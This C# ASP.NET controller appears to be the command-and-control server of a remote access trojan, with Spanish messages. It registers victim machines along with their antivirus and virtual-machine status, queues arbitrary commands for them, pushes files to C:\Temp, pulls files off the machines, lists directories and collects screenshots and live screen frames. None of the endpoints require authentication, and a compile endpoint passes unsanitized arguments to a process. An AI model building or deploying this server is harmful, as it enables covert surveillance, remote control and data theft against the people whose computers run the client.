using Microsoft.AspNetCore.Hosting.Server;
using System.Text;
using Microsoft.AspNetCore.Mvc;
using RMT_SERVER_MVC.Models;
using System.Runtime.InteropServices;
using Microsoft.AspNetCore.Http.Connections;
using Microsoft.AspNetCore.Mvc.ViewEngines;
using Microsoft.AspNetCore.Mvc.ViewFeatures;
using System.IO;
using System.Diagnostics;
using System.Reflection;

namespace RMT_SERVER_MVC.Controllers
{
    public class ClientsController : Controller
    {
        private readonly ILogger<ClientsController> _logger;
        private readonly IWebHostEnvironment _hostingEnvironment;
        private readonly ICompositeViewEngine _viewEngine;

        private static List<ClientModel> connectedClients = new List<ClientModel>();
        private static bool _isMonitoringActive = false;
        private static DateTime _lastActivityTime = DateTime.Now;

        public ClientsController(ILogger<ClientsController> logger, 
                               IWebHostEnvironment hostingEnvironment,
                               ICompositeViewEngine viewEngine)
        {
            _logger = logger;
            _hostingEnvironment = hostingEnvironment;
            _viewEngine = viewEngine;
        }

        [HttpGet]
        public IActionResult Index() => View(connectedClients);

        [HttpPost("api/upload-frame")]
        public async Task<IActionResult> UploadFrame()
        {
            if (!Request.Form.Files.Any())
                return BadRequest("No frame received");

            var file = Request.Form.Files[0];
            if (file.Length == 0)
                return BadRequest("Empty file");

            try
            {
                var framesDir = Path.Combine(_hostingEnvironment.WebRootPath, "frames");
                Directory.CreateDirectory(framesDir);

                var filePath = Path.Combine(framesDir, "last.jpg");
                using (var stream = new FileStream(filePath, FileMode.Create))
                {
                    await file.CopyToAsync(stream);
                }

                _lastActivityTime = DateTime.Now;
                return Ok();
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Error uploading frame");
                return StatusCode(500, "Internal server error");
            }
        }

        [HttpPost("api/start-monitor")]
        public IActionResult StartMonitor()
        {
            _isMonitoringActive = true;
            _lastActivityTime = DateTime.Now;
            return Ok(new { success = true, message = "Monitoring started" });
        }

        [HttpPost("api/stop-monitor")]
        public IActionResult StopMonitor()
        {
            _isMonitoringActive = false;
            return Ok(new { success = true, message = "Monitoring stopped" });
        }

        [HttpGet("api/monitor-status")]
        public IActionResult GetMonitorStatus()
        {
            return Ok(new
            {
                isActive = _isMonitoringActive,
                lastActivity = _lastActivityTime,
                inactiveSeconds = _isMonitoringActive ? (DateTime.Now - _lastActivityTime).TotalSeconds : 0
            });
        }

        [ResponseCache(Duration = 0, Location = ResponseCacheLocation.None, NoStore = true)]
        public IActionResult Error()
        {
            return View(new ErrorViewModel { RequestId = Activity.Current?.Id ?? HttpContext.TraceIdentifier });
        }

        [HttpGet]
        public JsonResult GetConnectedClients()
        {
            return Json(new
            {
                success = true,
                clients = connectedClients.Select(c => new {
                    c.Id,
                    c.MachineName,
                    c.IPAddress,
                    LastConnection = c.LastConnection,
                    c.IsOnline,
                    Screenshot = c.Screenshot
                }).ToList()
            });
        }

        [HttpPost]
        public JsonResult Register(
        [FromForm] string machineName,
        [FromForm] string userName,
        [FromForm] string ipAddress,
        [FromForm] string osVersion,
        [FromForm] string arch,
        [FromForm] string av,
        [FromForm] bool vm,
        [FromForm] string pais,
        [FromForm] string cpuCh,
        [FromForm] string ramCh,
        [FromForm] string driveL)
        {
            var existingClient = connectedClients.Find(
            c => c.MachineName == machineName 
            && c.UserName == userName
            && c.IPAddress == ipAddress 
            && c.OSVersion == osVersion 
            && c.OSArchitecture == arch 
            && c.Antivirus == av
            && c.IsVirtualMachine == vm
            && c.Country == pais
            && c.CPU == cpuCh
            && c.RAM == ramCh
            && c.Drives == driveL
            );

            if (existingClient != null)
            {
                existingClient.LastConnection = DateTime.Now;
                existingClient.IsOnline = true;
            }
            else
            {
                var newClient = new ClientModel
                {
                    Id = Guid.NewGuid().ToString(),
                    MachineName = machineName,
                    UserName = userName,
                    IPAddress = ipAddress,
                    OSVersion = osVersion,
                    OSArchitecture = arch,
                    Antivirus = av,
                    IsVirtualMachine = vm,
                    Country = pais,
                    CPU = cpuCh,
                    RAM = ramCh,
                    Drives = driveL,
                    Screenshot = new Screenshot(),
                    PendingCommands = new List<ClientCommand>(),
                    CommandResults = new List<CommandResult>(),
                    PendingFileTransfers = new List<FileTransferCommand>(),
                    FileSystemEntries = new List<FileSystemEntry>()
                };
                connectedClients.Add(newClient);
            }

            return Json(new { success = true });
        }


        [HttpPost]
        public JsonResult UpdateScreenshot([FromForm] string machineName, [FromForm] string ipAddress)
        {
            var screenshotFile = Request.Form.Files["screenshot"];

            if (screenshotFile == null)
            {
                return Json(new { success = false, message = "No se recibió captura" });
            }

            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                client = new ClientModel
                {
                    Id = Guid.NewGuid().ToString(),
                    MachineName = machineName,
                    IPAddress = ipAddress,
                    Screenshot = new Screenshot(),
                    PendingCommands = new List<ClientCommand>(),
                    CommandResults = new List<CommandResult>(),
                    PendingFileTransfers = new List<FileTransferCommand>(),
                    FileSystemEntries = new List<FileSystemEntry>()
                };
                connectedClients.Add(client);
            }

            string screenshotsDir = Path.Combine(_hostingEnvironment.WebRootPath, "Ankle Boots", "Clientes", machineName, "screenshots");

            Directory.CreateDirectory(screenshotsDir);
            //string timestamp = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
            string fileName = $"{machineName}_current.jpg";
            string filePath = Path.Combine(screenshotsDir, fileName);

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                screenshotFile.CopyTo(stream);
            }

            client.Screenshot = new Screenshot
            {
                FileName = fileName,
                FilePath = filePath,
                Timestamp = DateTime.Now
            };

            client.LastConnection = DateTime.Now;
            client.IsOnline = true;

            return Json(new { success = true, message = "Captura actualizada" });
        }


        // ... existing code ...

        [HttpPost]
        public JsonResult ReceiveClientScreenshot([FromForm] string machineName, [FromForm] string ipAddress, [FromForm] string commandId)
        {
            var screenshotFile = Request.Form.Files["screenshot"];

            if (screenshotFile == null)
            {
                return Json(new { success = false, message = "No se recibió captura" });
            }

            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            string screenshotsDir = Path.Combine(_hostingEnvironment.WebRootPath, "Ankle Boots", "Clientes", machineName, "command_screenshots");
            Directory.CreateDirectory(screenshotsDir);

            string timestamp = DateTime.Now.ToString("yyyy-MM-dd-HH-mm-ss");
            string fileName = $"{machineName}_command_{commandId}_{timestamp}.jpg";
            string filePath = Path.Combine(screenshotsDir, fileName);

            using (var stream = new FileStream(filePath, FileMode.Create))
            {
                screenshotFile.CopyTo(stream);
            }

            // Agregar el resultado al historial de comandos
            var commandResult = new CommandResult
            {
                CommandId = commandId,
                Result = $"Captura de pantalla guardada: {fileName}",
                IsError = false,
                Timestamp = DateTime.Now,
                ScreenshotPath = filePath
            };

            client.CommandResults.Add(commandResult);
            client.LastConnection = DateTime.Now;

            return Json(new { 
                success = true, 
                message = "Captura recibida y guardada",
                screenshotPath = filePath,
                commandId = commandId
            });
        }

// ... existing code ...
        
        

        [HttpPost]
        public JsonResult UploadFileForClient([FromForm] string clientId)
        {
            var client = connectedClients.FirstOrDefault(c => c.Id == clientId);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            if (Request.Form.Files.Count == 0)
            {
                return Json(new { success = false, message = "No se seleccionó ningún archivo" });
            }

            var file = Request.Form.Files[0];
            byte[] fileData;
            using (var memoryStream = new MemoryStream())
            {
                file.CopyTo(memoryStream);
                fileData = memoryStream.ToArray();
            }

            var transferCommand = new FileTransferCommand
            {
                Id = Guid.NewGuid().ToString(),
                FileName = Path.GetFileName(file.FileName),
                FileData = fileData,
                DestinationPath = "C:\\Temp\\" + Path.GetFileName(file.FileName),
                SentTime = DateTime.Now,
                Status = "Pending"
            };

            client.PendingFileTransfers.Add(transferCommand);

            return Json(new
            {
                success = true,
                message = $"Archivo {transferCommand.FileName} listo para enviar al cliente",
                transferId = transferCommand.Id
            });
        }

        [HttpPost]
        public JsonResult GetPendingFileTransfers([FromForm] string machineName, [FromForm] string ipAddress)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no registrado" });
            }

            var pendingTransfers = client.PendingFileTransfers
                .Where(ft => ft.Status == "Pending")
                .ToList();

            foreach (var transfer in pendingTransfers)
            {
                transfer.Status = "Sent";
            }

            return Json(new
            {
                success = true,
                transfers = pendingTransfers.Select(ft => new
                {
                    id = ft.Id,
                    fileName = ft.FileName,
                    fileData = Convert.ToBase64String(ft.FileData),
                    destinationPath = ft.DestinationPath
                })
            });
        }

        [HttpPost]
        public JsonResult SubmitFileTransferResult([FromForm] string machineName, [FromForm] string ipAddress,
                                                [FromForm] string transferId, [FromForm] bool success)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no registrado" });
            }

            var transfer = client.PendingFileTransfers.FirstOrDefault(ft => ft.Id == transferId);
            if (transfer != null)
            {
                transfer.Status = success ? "Completed" : "Failed";
                return Json(new { success = true, message = "Estado de transferencia actualizado" });
            }

            return Json(new { success = false, message = "Transferencia no encontrada" });
        }

        [HttpPost]
        public JsonResult SendCommand([FromForm] string clientId, [FromForm] string command)
        {
            var client = connectedClients.Find(c => c.Id == clientId);
            if (client == null || !client.IsOnline)
            {
                return Json(new { success = false, message = "Cliente no encontrado o desconectado" });
            }

            var newCommand = new ClientCommand
            {
                Id = Guid.NewGuid().ToString(),
                CommandText = command,
                SentTime = DateTime.Now,
                Status = "Pending"
            };

            client.PendingCommands.Add(newCommand);

            return Json(new
            {
                success = true,
                message = $"Comando '{command}' enviado al cliente {client.MachineName}",
                commandId = newCommand.Id
            });
        }

        [HttpPost]
        public JsonResult GetPendingCommands([FromForm] string machineName, [FromForm] string ipAddress)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no registrado" });
            }

            var pendingCommands = client.PendingCommands
                .Where(c => c.Status == "Pending")
                .ToList();

            foreach (var cmd in pendingCommands)
            {
                cmd.Status = "Sent";
            }

            return Json(new
            {
                success = true,
                commands = pendingCommands.Select(c => new
                {
                    id = c.Id,
                    command = c.CommandText
                })
            });
        }

        [HttpPost]
        public JsonResult SubmitCommandResult([FromForm] string machineName, [FromForm] string ipAddress,
                                            [FromForm] string commandId, [FromForm] string result,
                                            [FromForm] bool isError, [FromForm] int chunkNumber = 0,
                                            [FromForm] int totalChunks = 1, [FromForm] bool isPartial = false)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no registrado" });
            }

            var existingResult = client.CommandResults.FirstOrDefault(r => r.CommandId == commandId);
            if (existingResult == null)
            {
                existingResult = new CommandResult
                {
                    CommandId = commandId,
                    Result = "",
                    IsError = isError,
                    ReceivedTime = DateTime.Now,
                    PartialResults = new Dictionary<int, string>()
                };
                client.CommandResults.Add(existingResult);
            }

            if (isPartial)
            {
                existingResult.PartialResults[chunkNumber] = result;
                return Json(new { success = true, message = "Fragmento recibido" });
            }
            else
            {
                if (totalChunks > 1)
                {
                    var fullResult = new StringBuilder();
                    for (int i = 0; i < totalChunks; i++)
                    {
                        if (existingResult.PartialResults.TryGetValue(i, out string chunk))
                        {
                            fullResult.Append(chunk);
                        }
                    }
                    existingResult.Result = fullResult.ToString();
                    existingResult.PartialResults.Clear();
                }
                else
                {
                    existingResult.Result = result;
                }

                var command = client.PendingCommands.FirstOrDefault(c => c.Id == commandId);
                if (command != null)
                {
                    command.Status = "Completed";
                    command.CompletedTime = DateTime.Now;
                }

                return Json(new { success = true, message = "Resultado completo recibido" });
            }
        }

        [HttpPost]
        public JsonResult GetFileSystemEntries([FromForm] string clientId, [FromForm] string path = "")
        {
            var client = connectedClients.FirstOrDefault(c => c.Id == clientId);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no registrado" });
            }

            var command = $"LIST_DIR \"{path}\"";

            var newCommand = new ClientCommand
            {
                Id = Guid.NewGuid().ToString(),
                CommandText = command,
                SentTime = DateTime.Now,
                Status = "Pending"
            };

            client.PendingCommands.Add(newCommand);
            client.FileSystemEntries.Clear();

            return Json(new
            {
                success = true,
                commandId = newCommand.Id,
                message = "Comando para listar directorio enviado al cliente"
            });
        }

        [HttpPost]
        public JsonResult GetFileSystemEntriesResult([FromForm] string clientId)
        {
            var client = connectedClients.FirstOrDefault(c => c.Id == clientId);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            return Json(new
            {
                success = true,
                entries = client.FileSystemEntries.Select(e => new
                {
                    e.Name,
                    e.Path,
                    e.Type,
                    e.Size,
                    LastModified = e.LastModified.ToString("yyyy-MM-dd HH:mm:ss")
                })
            });
        }

        [HttpGet]
        public JsonResult GetCommandResults(string clientId)
        {
            var client = connectedClients.FirstOrDefault(c => c.Id == clientId);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            return Json(new
            {
                success = true,
                results = client.CommandResults.OrderByDescending(r => r.ReceivedTime)
                    .Select(r => new
                    {
                        commandId = r.CommandId,
                        result = r.Result,
                        isError = r.IsError,
                        receivedTime = r.ReceivedTime
                    })
            });
        }

        [HttpPost]
        public JsonResult RequestFileDownload([FromForm] string clientId, [FromForm] string filePath)
        {
            var client = connectedClients.FirstOrDefault(c => c.Id == clientId);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            var command = new ClientCommand
            {
                Id = Guid.NewGuid().ToString(),
                CommandText = $"DOWNLOAD_FILE \"{filePath}\"",
                SentTime = DateTime.Now,
                Status = "Pending"
            };

            client.PendingCommands.Add(command);

            return Json(new
            {
                success = true,
                message = "Solicitud de descarga enviada al cliente",
                commandId = command.Id
            });
        }

        [HttpGet]
        public IActionResult DownloadFileFromClient(string commandId)
        {
            var client = connectedClients.FirstOrDefault(c => c.CommandResults.Any(r => r.CommandId == commandId));
            if (client == null)
            {
                return NotFound("Cliente no encontrado");
            }

            var result = client.CommandResults.FirstOrDefault(r => r.CommandId == commandId);
            if (result == null)
            {
                return NotFound("Resultado no encontrado");
            }

            try
            {
                var fileData = Convert.FromBase64String(result.Result);
                var fileName = $"downloaded_{DateTime.Now:yyyyMMddHHmmss}.dat";

                var command = client.PendingCommands.FirstOrDefault(c => c.Id == commandId);
                if (command != null && command.CommandText.StartsWith("DOWNLOAD_FILE"))
                {
                    var filePath = command.CommandText.Substring("DOWNLOAD_FILE".Length).Trim().Trim('"');
                    fileName = Path.GetFileName(filePath);
                }

                return File(fileData, "application/octet-stream", fileName);
            }
            catch (Exception ex)
            {
                return BadRequest($"Error al procesar el archivo: {ex.Message}");
            }
        }

        [HttpPost]
        public JsonResult ReceiveScreenFrame([FromForm] string machineName, [FromForm] string ipAddress)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            var screenshotFile = Request.Form.Files["frame"];
            if (screenshotFile == null)
            {
                return Json(new { success = false, message = "No se recibió frame" });
            }

            byte[] frameData;
            using (var memoryStream = new MemoryStream())
            {
                screenshotFile.CopyTo(memoryStream);
                frameData = memoryStream.ToArray();
            }

            var frame = new ScreenshotFrame
            {
                FrameNumber = client.ScreenshotFrames.Count + 1,
                ImageData = Convert.ToBase64String(frameData),
                Timestamp = DateTime.Now
            };

            client.ScreenshotFrames.Enqueue(frame);
            while (client.ScreenshotFrames.Count > client.MaxFrames)
            {
                client.ScreenshotFrames.Dequeue();
            }

            client.LastConnection = DateTime.Now;
            client.IsOnline = true;

            return Json(new { success = true, message = "Frame recibido" });
        }

        [HttpGet]
        public JsonResult GetScreenStream(string machineName, string ipAddress)
        {
            var client = connectedClients.FirstOrDefault(c => c.MachineName == machineName && c.IPAddress == ipAddress);
            if (client == null)
            {
                return Json(new { success = false, message = "Cliente no encontrado" });
            }

            var frames = client.ScreenshotFrames.ToList();
            return Json(new
            {
                success = true,
                frames = frames.Select(f => new
                {
                    f.FrameNumber,
                    f.ImageData,
                    f.Timestamp
                })
            });
        }

        [HttpPost]
        public IActionResult CompileProject(string path, string configuration, string platform)
        {
            try
            {
                var startInfo = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = "cm.exe",
                    Arguments = $"-path=\"{path}\" -c {configuration} -p \"{platform}\"",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    CreateNoWindow = true,
                    WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory
                };

                using (var process = System.Diagnostics.Process.Start(startInfo))
                {
                    process.WaitForExit();
                    var output = process.StandardOutput.ReadToEnd();
                    var error = process.StandardError.ReadToEnd();

                    if (process.ExitCode == 0)
                    {
                        return Content($"Compilación exitosa:\n{output}");
                    }
                    else
                    {
                        return Content($"Error en la compilación:\n{error}");
                    }
                }
            }
            catch (Exception ex)
            {
                return Content($"Error al ejecutar la compilación: {ex.Message}");
            }
        }

    }
}
